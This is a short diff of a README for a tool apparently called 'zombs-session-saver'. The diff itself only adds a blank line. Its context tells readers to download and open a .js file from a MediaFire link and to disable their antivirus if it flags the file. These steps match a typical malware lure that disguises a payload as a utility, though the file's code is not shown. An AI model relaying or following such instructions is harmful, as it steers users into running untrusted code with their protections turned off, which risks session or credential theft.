@@ -18,6 +18,7 @@ Please read the following instructions:
 ------------------------------------------------------
 3. Download and open this file: [https://www.mediafire.com/file/o8pgwpqxcaap33h/ssss.js/file](https://www.mediafire.com/file/o8pgwpqxcaap33h/ssss.js/file)
 ![image](https://github.com/LBBZombs/zombs-session-saver/assets/139074757/44b764fe-5784-4907-a15a-c31388105681)
+
 [IMPORTANT] If your antivirus flags it, disable it and try it again.
 ------------------------------------------------------
 4. Click on `Open File` in `Visual Studio Code`:
